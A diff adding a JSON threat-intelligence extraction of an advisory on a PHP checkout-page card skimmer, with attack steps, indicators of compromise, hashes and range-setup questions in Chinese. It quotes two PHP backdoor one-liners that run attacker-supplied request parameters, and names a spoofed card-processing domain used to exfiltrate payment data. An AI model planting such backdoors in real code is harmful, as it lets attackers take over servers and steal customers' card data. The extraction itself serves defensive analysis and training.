@@ -1,0 +1,1100 @@
+{
+ "schema_version": "1.0",
+ "name": "csa-2022-220516",
+ "provenance": {
+  "input_kind": "markdown",
+  "input_sha256": "755124ec9878ea32de89c88cb7a8bb0e89092cf9a6391c8a26bf5efafe7b127a",
+  "source_name": "csa-2022-220516"
+ },
+ "actions": [
+  {
+   "id": "a1",
+   "name": "Injected malicious PHP code into the business’s online checkout page",
+   "source": "llm",
+   "description": "Unidentified cyber actors injected malicious PHP code into the business’s customized online checkout page, checkout.php, by altering the associated TempOrders.php file.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-1"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a2",
+   "name": "Used require_once() function to call and execute TempOrders.php file",
+   "source": "llm",
+   "description": "The unidentified cyber actors used the require_once() function to call and execute the TempOrders.php file, which contained code used to scrape and exfiltrate customer data from the US business’ shopping cart to a victim-specific PHP file.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-2"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a3",
+   "name": "Posted customer payment information to spoofed card processing domain",
+   "source": "llm",
+   "description": "The malicious code posts the customer’s payment information to a spoofed card processing domain, http://authorizen[.]net/, impersonating a legitimate card processing company’s domain.",
+   "target_host_ref": "unknown",
+   "evidence_refs": [
+    "evidence-3"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded",
+   "source_host_ref": "h1"
+  },
+  {
+   "id": "a4",
+   "name": "Established rudimentary back door by inserting assert($_REQUEST['login']) function",
+   "source": "llm",
+   "description": "The actors established a rudimentary back door by inserting the assert($_REQUEST['login']) function, which executes code submitted as the HTTP request parameter “login”.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-4"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a5",
+   "name": "Downloaded P.A.S. webshell onto the affected company’s webserver",
+   "source": "llm",
+   "description": "Upon execution of the backdoor, the system downloads a fully functional P.A.S. webshell onto the affected company’s webserver.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-5"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a6",
+   "name": "Inserted PHP regular expression @preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\") to execute PHP code from HTTP request variable",
+   "source": "llm",
+   "description": "The actors inserted the PHP regular expression @preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"), designed to insert and execute PHP code submitted as an HTTP request variable named “u”.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-6"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded"
+  },
+  {
+   "id": "a7",
+   "name": "Downloaded two PHP webshells, P.A.S. and b374, for backdoor access",
+   "source": "llm",
+   "description": "Using the described techniques, the actors downloaded two PHP Webshells, P.A.S. and b374, which were leveraged as backdoors for further exploitation.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-7"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded"
+  }
+ ],
+ "relations": [
+  {
+   "id": "r1",
+   "from_action": "a1",
+   "to_action": "a2",
+   "kind": "dependency",
+   "source": "llm",
+   "rationale": "require_once() function used to call and execute the TempOrders.php file injected with malicious PHP code",
+   "evidence_refs": [
+    "evidence-2"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "id": "r2",
+   "from_action": "a2",
+   "to_action": "a3",
+   "kind": "dependency",
+   "source": "llm",
+   "rationale": "malicious code posts the customer’s payment information after require_once() executes TempOrders.php",
+   "evidence_refs": [
+    "evidence-3"
+   ],
+   "epistemic_status": "inferred",
+   "epistemic_reason": "引句存在於原文，但沒有陳述先後或相依的字眼；此關係是依敘事順序推論，需人工確認。"
+  },
+  {
+   "id": "r3",
+   "from_action": "a4",
+   "to_action": "a5",
+   "kind": "dependency",
+   "source": "llm",
+   "rationale": "upon execution of the rudimentary back door, the system downloads the P.A.S. webshell",
+   "evidence_refs": [
+    "evidence-5"
+   ],
+   "epistemic_status": "inferred",
+   "epistemic_reason": "引句只陳述先後順序，沒有陳述後一步使用前一步的結果；相依屬推論，需人工確認。"
+  },
+  {
+   "id": "r4",
+   "from_action": "a4",
+   "to_action": "a6",
+   "kind": "temporal",
+   "source": "llm",
+   "rationale": "second, the actors inserted the PHP regular expression after establishing the rudimentary back door",
+   "evidence_refs": [
+    "evidence-6"
+   ],
+   "epistemic_status": "inferred",
+   "epistemic_reason": "引句存在於原文，但沒有陳述先後或相依的字眼；此關係是依敘事順序推論，需人工確認。"
+  },
+  {
+   "id": "r5",
+   "from_action": "a6",
+   "to_action": "a7",
+   "kind": "dependency",
+   "source": "llm",
+   "rationale": "using the described techniques, including the inserted PHP regular expression, the actors downloaded two PHP webshells",
+   "evidence_refs": [
+    "evidence-7"
+   ],
+   "epistemic_status": "supported"
+  }
+ ],
+ "hosts": [
+  {
+   "id": "h1",
+   "role": "business’s online checkout page host",
+   "source": "llm",
+   "name": "US business webserver",
+   "evidence_refs": [
+    "evidence-8",
+    "evidence-9"
+   ],
+   "epistemic_status": "insufficient"
+  }
+ ],
+ "services": [
+  {
+   "id": "s1",
+   "name": "PHP Hypertext Preprocessor (PHP)",
+   "source": "llm",
+   "cve": [],
+   "host_ref": "h1",
+   "evidence_refs": [],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "id": "s2",
+   "name": "MySQL database (implied by Adminer usage)",
+   "source": "llm",
+   "cve": [],
+   "host_ref": "h1",
+   "evidence_refs": [],
+   "epistemic_status": "insufficient"
+  }
+ ],
+ "target_context": {
+  "host_refs": [
+   "h1"
+  ],
+  "service_refs": [
+   "s1",
+   "s2"
+  ]
+ },
+ "artifacts": [
+  {
+   "name": "TempOrders.php",
+   "type": "file",
+   "id": "a1",
+   "source": "llm",
+   "evidence_refs": [],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "name": "checkout.php",
+   "type": "file",
+   "id": "a2",
+   "source": "llm",
+   "evidence_refs": [],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "name": "P.A.S. webshell",
+   "type": "malware",
+   "id": "a3",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-10"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "name": "b374 webshell",
+   "type": "malware",
+   "id": "a4",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-11"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "name": "assert($_REQUEST['login']) function",
+   "type": "code snippet",
+   "id": "a5",
+   "source": "llm",
+   "evidence_refs": [],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "name": "@preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\")",
+   "type": "code snippet",
+   "id": "a6",
+   "source": "llm",
+   "evidence_refs": [],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "name": "file_name.php",
+   "type": "file",
+   "id": "a7",
+   "source": "llm",
+   "evidence_refs": [],
+   "epistemic_status": "insufficient"
+  }
+ ],
+ "indicators": [
+  {
+   "id": "indicator-1",
+   "type": "domain",
+   "value": "authorizen.net",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-12",
+    "evidence-13"
+   ]
+  },
+  {
+   "id": "indicator-2",
+   "type": "domain",
+   "value": "file_name.php",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-14"
+   ]
+  },
+  {
+   "id": "indicator-3",
+   "type": "url",
+   "value": "http://authorizen[.]net/",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-15"
+   ]
+  },
+  {
+   "id": "indicator-4",
+   "type": "url",
+   "value": "http://authorize[.]net/",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-16"
+   ]
+  },
+  {
+   "id": "indicator-5",
+   "type": "domain",
+   "value": "authorizen[.]net",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-17"
+   ]
+  },
+  {
+   "id": "indicator-6",
+   "type": "domain",
+   "value": "authorize[.]net",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-18"
+   ]
+  },
+  {
+   "id": "indicator-7",
+   "type": "domain",
+   "value": "www.company.com",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-19",
+    "evidence-20"
+   ]
+  },
+  {
+   "id": "indicator-8",
+   "type": "domain",
+   "value": "legit.php",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-21"
+   ]
+  },
+  {
+   "id": "indicator-9",
+   "type": "domain",
+   "value": "raw.githubusercontetn.com",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-22"
+   ]
+  },
+  {
+   "id": "indicator-10",
+   "type": "domain",
+   "value": "otherLegitFile.php",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-23"
+   ]
+  },
+  {
+   "id": "indicator-11",
+   "type": "hash",
+   "value": "73B4EF0EDA0BF07EF4DC1C543F668018",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-24"
+   ]
+  },
+  {
+   "id": "indicator-12",
+   "type": "hash",
+   "value": "Ac28e5f136e9307d965466f77cf0845dc4cf08a701323ab4fbc66d91b28cfab9",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-25"
+   ]
+  },
+  {
+   "id": "indicator-13",
+   "type": "hash",
+   "value": "6f81a02b802d17e9dc7fc846eb1ce8f14e10b813",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-26"
+   ]
+  },
+  {
+   "id": "indicator-14",
+   "type": "hash",
+   "value": "0D43648311AC978702538CF1AC4E1257",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-27"
+   ]
+  },
+  {
+   "id": "indicator-15",
+   "type": "hash",
+   "value": "9a0023406283d9856b07b2d39b4444130001f86131841df2eba206f0ae379b6c",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-28"
+   ]
+  },
+  {
+   "id": "indicator-16",
+   "type": "hash",
+   "value": "595ce84634536b3a2cc0d6dd05af7003ce8ed04a",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-29"
+   ]
+  },
+  {
+   "id": "indicator-17",
+   "type": "hash",
+   "value": "05A7373DAA77917128535C76B2B363FE",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-30"
+   ]
+  },
+  {
+   "id": "indicator-18",
+   "type": "hash",
+   "value": "0b754dee14703b23b97dbb50baa5b83931003f0744822eb6a76b0291fb1e6587",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-31"
+   ]
+  },
+  {
+   "id": "indicator-19",
+   "type": "hash",
+   "value": "5d46d944af2a9dda829a653856c7ea9ec723dfc5",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-32"
+   ]
+  },
+  {
+   "id": "indicator-20",
+   "type": "domain",
+   "value": "www.ic3.gov",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-33"
+   ]
+  }
+ ],
+ "commands": [],
+ "evidence": [
+  {
+   "id": "evidence-1",
+   "quote": "The actors inserted malicious PHP code into the business’s customized online checkout page, checkout.php, by altering the associated TempOrders.php file.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "7"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The actors inserted malicious PHP code into the business’s customized online checkout page, checkout.php, by altering the associated TempOrders.php file."
+  },
+  {
+   "id": "evidence-2",
+   "quote": "As of January 2022, the unidentified cyber actors used the require_once() function to call and execute the TempOrders.php file, which contained code used to scrape and exfiltrate customer data from the US business’ shopping cart to a victim-specific PHP file “file_name.php”",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "9"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "As of January 2022, the unidentified cyber actors used the require_once() function to call and execute the TempOrders.php file, which contained code used to scr"
+  },
+  {
+   "id": "evidence-3",
+   "quote": "The malicious code posts the customer’s payment information to a spoofed card processing domain, http://authorizen[.]net/, where the ‘n’ is added to impersonate or spoof http://authorize[.]net/, a legitimate card processing company’s domain.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "10"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The malicious code posts the customer’s payment information to a spoofed card processing domain, http://authorizen[.]net/, where the ‘n’ is added to impersonate"
+  },
+  {
+   "id": "evidence-4",
+   "quote": "First, the actors established a rudimentary back door by inserting the assert($_REQUEST['login']) function. This function is designed for debugging and when called executes code submitted as the HTTP request parameter “login”.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "First, the actors established a rudimentary back door by inserting the assert($_REQUEST['login']) function. This function is designed for debugging and when cal"
+  },
+  {
+   "id": "evidence-5",
+   "quote": "Upon execution, the system downloads a fully functional P.A.S. webshell onto the affected company’s webserver.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Upon execution, the system downloads a fully functional P.A.S. webshell onto the affected company’s webserver."
+  },
+  {
+   "id": "evidence-6",
+   "quote": "Second, the actors inserted the PHP regular expression @preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"), which is designed to insert and execute PHP code submitted as an HTTP request variable named “u”.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "12"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Second, the actors inserted the PHP regular expression @preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"), which is designed to insert and execute PHP code submitted a"
+  },
+  {
+   "id": "evidence-7",
+   "quote": "Using the described techniques, the actors downloaded two PHP Webshells, P.A.S. and b374, which were leveraged as backdoors for further exploitation.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "13"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Using the described techniques, the actors downloaded two PHP Webshells, P.A.S. and b374,\nwhich were leveraged as backdoors for further exploitation."
+  },
+  {
+   "id": "evidence-8",
+   "quote": "Unidentified cyber actors injected malicious PHP code into the business’s customized online checkout page, checkout.php, by altering the associated TempOrders.php file.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "7"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.9474,
+   "matched_text": "ted malicious PHP code into the business’s customized online checkout page, checkout.php, by altering the associated TempOrders.php file."
+  },
+  {
+   "id": "evidence-9",
+   "quote": "Upon execution of the backdoor, the system downloads a fully functional P.A.S. webshell onto the affected company’s webserver.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.9286,
+   "matched_text": ", the system downloads a fully functional P.A.S. webshell onto the affected company’s webserver."
+  },
+  {
+   "id": "evidence-10",
+   "quote": "P.A.S. webshell (aka Fobushell) was developed and published by Ukrainian developer Jaroslav Volodimirovich Panchenko (aka Profexer).",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "15"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "P.A.S. webshell (aka Fobushell) was developed and published by Ukrainian developer Jaroslav Volodimirovich Panchenko (aka Profexer)."
+  },
+  {
+   "id": "evidence-11",
+   "quote": "This was a webshell published at Github.com/b374k/b374k.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "16"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "This was a webshell published at Github.com/b374k/b374k."
+  },
+  {
+   "id": "evidence-12",
+   "quote": "authorizen.net",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "9"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "authorizen.net"
+  },
+  {
+   "id": "evidence-13",
+   "quote": "authorizen.net",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "18"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "authorizen.net"
+  },
+  {
+   "id": "evidence-14",
+   "quote": "file_name.php",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "9"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "file_name.php"
+  },
+  {
+   "id": "evidence-15",
+   "quote": "http://authorizen[.]net/",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "10"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "http://authorizen[.]net/"
+  },
+  {
+   "id": "evidence-16",
+   "quote": "http://authorize[.]net/",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "10"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "http://authorize[.]net/"
+  },
+  {
+   "id": "evidence-17",
+   "quote": "authorizen[.]net",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "10"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "authorizen[.]net"
+  },
+  {
+   "id": "evidence-18",
+   "quote": "authorize[.]net",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "10"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "authorize[.]net"
+  },
+  {
+   "id": "evidence-19",
+   "quote": "www.company.com",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "www.company.com"
+  },
+  {
+   "id": "evidence-20",
+   "quote": "www.company.com",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "12"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "www.company.com"
+  },
+  {
+   "id": "evidence-21",
+   "quote": "legit.php",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "legit.php"
+  },
+  {
+   "id": "evidence-22",
+   "quote": "raw.githubusercontetn.com",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "raw.githubusercontetn.com"
+  },
+  {
+   "id": "evidence-23",
+   "quote": "otherLegitFile.php",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "12"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "otherLegitFile.php"
+  },
+  {
+   "id": "evidence-24",
+   "quote": "73B4EF0EDA0BF07EF4DC1C543F668018",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "15"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "73B4EF0EDA0BF07EF4DC1C543F668018"
+  },
+  {
+   "id": "evidence-25",
+   "quote": "Ac28e5f136e9307d965466f77cf0845dc4cf08a701323ab4fbc66d91b28cfab9",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "15"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Ac28e5f136e9307d965466f77cf0845dc4cf08a701323ab4fbc66d91b28cfab9"
+  },
+  {
+   "id": "evidence-26",
+   "quote": "6f81a02b802d17e9dc7fc846eb1ce8f14e10b813",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "15"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "6f81a02b802d17e9dc7fc846eb1ce8f14e10b813"
+  },
+  {
+   "id": "evidence-27",
+   "quote": "0D43648311AC978702538CF1AC4E1257",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "16"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "0D43648311AC978702538CF1AC4E1257"
+  },
+  {
+   "id": "evidence-28",
+   "quote": "9a0023406283d9856b07b2d39b4444130001f86131841df2eba206f0ae379b6c",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "16"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "9a0023406283d9856b07b2d39b4444130001f86131841df2eba206f0ae379b6c"
+  },
+  {
+   "id": "evidence-29",
+   "quote": "595ce84634536b3a2cc0d6dd05af7003ce8ed04a",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "16"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "595ce84634536b3a2cc0d6dd05af7003ce8ed04a"
+  },
+  {
+   "id": "evidence-30",
+   "quote": "05A7373DAA77917128535C76B2B363FE",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "17"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "05A7373DAA77917128535C76B2B363FE"
+  },
+  {
+   "id": "evidence-31",
+   "quote": "0b754dee14703b23b97dbb50baa5b83931003f0744822eb6a76b0291fb1e6587",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "17"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "0b754dee14703b23b97dbb50baa5b83931003f0744822eb6a76b0291fb1e6587"
+  },
+  {
+   "id": "evidence-32",
+   "quote": "5d46d944af2a9dda829a653856c7ea9ec723dfc5",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "17"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "5d46d944af2a9dda829a653856c7ea9ec723dfc5"
+  },
+  {
+   "id": "evidence-33",
+   "quote": "www.ic3.gov",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "24"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "www.ic3.gov"
+  }
+ ],
+ "missing_items": [
+  {
+   "id": "missing-hosts-h1-os",
+   "field": "US business webserver — 作業系統",
+   "category": "host",
+   "reason": "來源未提供這台主機/資產的作業系統；不能由產品或角色直接推定。",
+   "severity": "major",
+   "status": "open",
+   "question": "US business webserver 實際使用哪個作業系統？原文只提供主機/資產線索，請填實際系統或標記未知。",
+   "affects": [
+    "hosts:h1 — US business webserver",
+    "action:a1 — Injected malicious PHP code into the business’s online checkout page",
+    "action:a2 — Used require_once() function to call and execute TempOrders.php file",
+    "action:a4 — Established rudimentary back door by inserting assert($_REQUEST['login']) function",
+    "action:a5 — Downloaded P.A.S. webshell onto the affected company’s webserver",
+    "action:a6 — Inserted PHP regular expression @preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\") to execute PHP code from HTTP request variable",
+    "action:a7 — Downloaded two PHP webshells, P.A.S. and b374, for backdoor access"
+   ],
+   "suggestions": [
+    "Windows Server（候選；需確認）",
+    "Linux Server（候選；需確認）",
+    "其他作業系統（請填確切名稱）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "US business webserver",
+     "source_ref": "hosts:h1.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-8",
+      "evidence-9",
+      "evidence-1",
+      "evidence-2",
+      "evidence-4",
+      "evidence-5",
+      "evidence-6",
+      "evidence-7"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "examples": [
+    "Windows Server（候選；需確認）",
+    "Linux Server（候選；需確認）",
+    "其他作業系統（請填確切名稱）"
+   ],
+   "target": {
+    "collection": "hosts",
+    "id": "h1",
+    "field": "os"
+   }
+  },
+  {
+   "id": "missing-hosts-h1-os-version",
+   "field": "US business webserver — 作業系統版本",
+   "category": "version",
+   "reason": "來源未提供這台主機/資產的確切 OS 版本或 build。",
+   "severity": "major",
+   "status": "open",
+   "question": "US business webserver 的作業系統確切版本/build 是什麼？若無法確認，請明確保留未知。",
+   "affects": [
+    "hosts:h1 — US business webserver",
+    "action:a1 — Injected malicious PHP code into the business’s online checkout page",
+    "action:a2 — Used require_once() function to call and execute TempOrders.php file",
+    "action:a4 — Established rudimentary back door by inserting assert($_REQUEST['login']) function",
+    "action:a5 — Downloaded P.A.S. webshell onto the affected company’s webserver",
+    "action:a6 — Inserted PHP regular expression @preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\") to execute PHP code from HTTP request variable",
+    "action:a7 — Downloaded two PHP webshells, P.A.S. and b374, for backdoor access"
+   ],
+   "suggestions": [
+    "請填原文或資產清單中的確切作業系統版本",
+    "Windows Server（build 待確認）",
+    "Linux 發行版（版本待確認）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "US business webserver",
+     "source_ref": "hosts:h1.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-8",
+      "evidence-9",
+      "evidence-1",
+      "evidence-2",
+      "evidence-4",
+      "evidence-5",
+      "evidence-6",
+      "evidence-7"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h1",
+    "field": "os_version"
+   }
+  },
+  {
+   "id": "missing-hosts-h1-network",
+   "field": "US business webserver — 網段/網路位置",
+   "category": "network",
+   "reason": "IR 有主機或資產線索，但沒有可部署的網段與可達性設定。",
+   "severity": "major",
+   "status": "open",
+   "question": "US business webserver 要放在哪個網段？請指出隔離/內網/DMZ 等位置，以及哪些來源可以連到它。",
+   "affects": [
+    "hosts:h1 — US business webserver",
+    "action:a1 — Injected malicious PHP code into the business’s online checkout page",
+    "action:a2 — Used require_once() function to call and execute TempOrders.php file",
+    "action:a4 — Established rudimentary back door by inserting assert($_REQUEST['login']) function",
+    "action:a5 — Downloaded P.A.S. webshell onto the affected company’s webserver",
+    "action:a6 — Inserted PHP regular expression @preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\") to execute PHP code from HTTP request variable",
+    "action:a7 — Downloaded two PHP webshells, P.A.S. and b374, for backdoor access"
+   ],
+   "suggestions": [
+    "隔離測試網段（只連必要主機）",
+    "內部網段（請描述允許來源）",
+    "對外 DMZ（只有原文/拓樸確認時才選）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "US business webserver",
+     "source_ref": "hosts:h1.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-8",
+      "evidence-9",
+      "evidence-1",
+      "evidence-2",
+      "evidence-4",
+      "evidence-5",
+      "evidence-6",
+      "evidence-7"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h1",
+    "field": "network_placement"
+   }
+  },
+  {
+   "id": "missing-network-outbound-policy",
+   "field": "下載/C2 步驟的對外連線政策",
+   "category": "network",
+   "reason": "多個具名步驟需要下載檔案或建立 Ngrok/C2 連線，但 IR 沒有說明靶場允許哪些外連。",
+   "severity": "major",
+   "status": "open",
+   "question": "a5, a7 涉及下載、上傳或 Ngrok/C2。靶場是否完全封鎖外連、只接 sinkhole/模擬服務，或僅允許原文列出的目的地？請指定封鎖/允許規則；不要直接開放任意網際網路。",
+   "affects": [
+    "action:a5 — Downloaded P.A.S. webshell onto the affected company’s webserver",
+    "action:a7 — Downloaded two PHP webshells, P.A.S. and b374, for backdoor access"
+   ],
+   "suggestions": [
+    "封鎖對外連線（隔離預設）",
+    "只允許連到指定 sinkhole/模擬服務",
+    "只允許報告列出的目的地（需確認隔離規則）"
+   ],
+   "known": [
+    {
+     "field": "需要外連的步驟",
+     "value": "Downloaded P.A.S. webshell onto the affected company’s webserver",
+     "source_ref": "actions:a5.name",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-5"
+     ]
+    },
+    {
+     "field": "需要外連的步驟",
+     "value": "Downloaded two PHP webshells, P.A.S. and b374, for backdoor access",
+     "source_ref": "actions:a7.name",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-7"
+     ]
+    }
+   ],
+   "needs_user_decision": true
+  },
+  {
+   "id": "missing-gap-exploited-weakness",
+   "field": "被利用的弱點（CVE／弱點類型）",
+   "category": "software",
+   "reason": "步驟描述了弱點利用，但 IR 沒有弱點編號或弱點類型；沒有它就無法選定可重現的版本與驗證方式。",
+   "severity": "major",
+   "status": "open",
+   "question": "這些步驟利用的是哪個產品的哪個弱點？目前已知目標軟體：PHP Hypertext Preprocessor (PHP), MySQL database (implied by Adminer usage)。請提供 CVE 編號或弱點類型；若來源沒有寫，請明確選擇教學用的替代弱點並標記為假設。",
+   "affects": [
+    "action:a7 — Downloaded two PHP webshells, P.A.S. and b374, for backdoor access",
+    "host:h1 — US business webserver"
+   ],
+   "suggestions": [
+    "填入來源或其他公開資料記載的 CVE（請註明出處）",
+    "選用靶場已有的漏洞練習標的並標記為假設",
+    "無法確認；保留為未知"
+   ],
+   "known": [
+    {
+     "field": "相關步驟",
+     "value": "Downloaded two PHP webshells, P.A.S. and b374, for backdoor access",
+     "source_ref": "actions:a7.name",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-7"
+     ]
+    }
+   ],
+   "needs_user_decision": true
+  }
+ ],
+ "quality": {
